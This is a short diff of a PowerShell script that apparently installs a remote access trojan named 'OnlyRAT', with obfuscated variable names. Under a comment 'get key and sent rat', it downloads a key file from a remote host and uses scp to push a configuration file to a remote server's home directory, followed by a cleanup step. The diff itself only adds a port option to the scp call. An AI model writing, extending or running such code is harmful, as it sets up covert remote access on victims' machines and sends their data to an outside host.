@@ -73,7 +73,7 @@ Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type
 
 # get key and sent rat
 Invoke-WebRequest -Uri "http://$ecPlmJVLRo/onlyrat.key" -OutFile "$env:temp\key"
-scp -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
+scp -P $ENyMAhIrsb -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
 
 # cleanup
 Set-Location C:\Users
